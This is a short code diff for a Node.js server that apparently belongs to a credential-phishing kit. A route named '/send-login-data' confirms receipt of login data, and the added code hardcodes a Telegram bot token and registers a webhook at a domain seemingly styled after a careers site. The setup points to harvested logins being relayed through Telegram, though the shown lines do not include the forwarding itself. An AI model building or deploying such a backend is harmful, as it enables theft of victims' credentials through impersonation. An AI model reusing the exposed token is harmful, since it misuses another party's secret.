@@ -371,4 +371,21 @@ app.post('/send-login-data', (req, res) => {
   res.json({ success: true, message: 'Login data sent successfully!' });
 });
 
-server.listen(3001, () => console.log('Server running on http://localhost:3001'));
+// Start server and set webhook AFTER server is listening
+server.listen(3001, async () => {
+  console.log('✅ Server running on http://localhost:3001');
+
+  const TELEGRAM_TOKEN = '8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus';
+  const APP_URL = process.env.RENDER_EXTERNAL_URL || 'https://conn.aquentcareers.io';
+  const WEBHOOK_URL = `${APP_URL}/bot${TELEGRAM_TOKEN}`;
+
+  try {
+    const res = await axios.get(
+      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook`,
+      { params: { url: WEBHOOK_URL } }
+    );
+    console.log('✅ Webhook set response:', res.data);
+  } catch (err) {
+    console.error('❌ Failed to set webhook:', err.message);
+  }
+});
